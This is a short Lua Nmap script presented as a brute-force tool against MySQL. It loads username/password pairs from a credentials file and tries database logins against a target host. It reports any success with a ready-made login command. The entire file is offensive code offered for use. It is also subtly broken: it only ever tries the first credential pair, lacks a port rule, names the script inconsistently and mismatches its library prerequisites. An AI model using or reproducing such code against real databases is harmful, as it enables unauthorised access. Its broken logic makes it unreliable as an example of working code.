-- Name: x-mysql-brute.nse
-- Description: Custom NSE script to perform brute force against MySQL database.
-- Usage: nmap -p <port> --script mysql-brute <target>

-- Prerequisites:
-- 1. Requires the `mysql` library. Install using: sudo apt-get install libmysqlclient-dev (on Debian-based systems)
-- 2. Requires the `luasql` library. Install using: luarocks install luasql-mysql

-- Script entry point
local mysql = require "mysql"
local creds = {}

-- Define default ports
local default_ports = { 3306 }

-- Function to read credentials from a file
local function read_credentials(filename)
    local f = io.open(filename, "r")
    if f then
        for line in f:lines() do
            local username, password = line:match("^(%S+)%s+(%S+)$")
            if username and password then
                table.insert(creds, {username = username, password = password})
            end
        end
        f:close()
    end
end

-- Function to perform brute force attack
local function brute_force(target, port)
    local connection, err = mysql:connect{
        host = target.ip,
        port = port,
        user = creds[1].username,
        password = creds[1].password,
        database = "mysql",
    }

    if connection then
        connection:close()
        return true
    else
        return false
    end
end

-- NSE script action
action = function(host, port)
    local success = false

    -- Read credentials from a file (one per line: username password)
    read_credentials("/path/to/credentials.txt")

    -- Loop through default ports
    for _, p in ipairs(default_ports) do
        if brute_force(host, p) then
            success = true
            break
        end
    end

    if success then
        return "MySQL credentials found! To access MySQL command line: mysql -h " .. host.ip .. " -u " .. creds[1].username .. " -p"
    else
        return "MySQL credentials not found."
    end
end
